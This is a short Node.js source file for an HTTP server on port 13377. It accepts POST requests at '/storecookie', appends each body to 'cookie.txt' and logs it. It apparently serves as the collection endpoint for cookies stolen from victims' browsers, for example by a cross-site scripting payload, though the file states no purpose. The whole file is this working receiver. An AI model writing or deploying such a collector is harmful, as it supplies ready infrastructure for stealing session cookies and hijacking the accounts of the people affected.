const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/storecookie') {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk;
    });

    req.on('end', () => {
      fs.appendFile('cookie.txt', `${body}\n`, (err) => {
        if (err) {
          console.error(err);
          res.writeHead(500);
          res.end('Failed to store cookie');
        } else {
          console.log(`Received and stored cookie: ${body}`);
          res.writeHead(200);
          res.end('Cookie received and stored');
        }
      });
    });
  } else {
    res.writeHead(404);
    res.end();
  }
});

server.listen(13377, () => {
  console.log('Server started on port 13377');
});
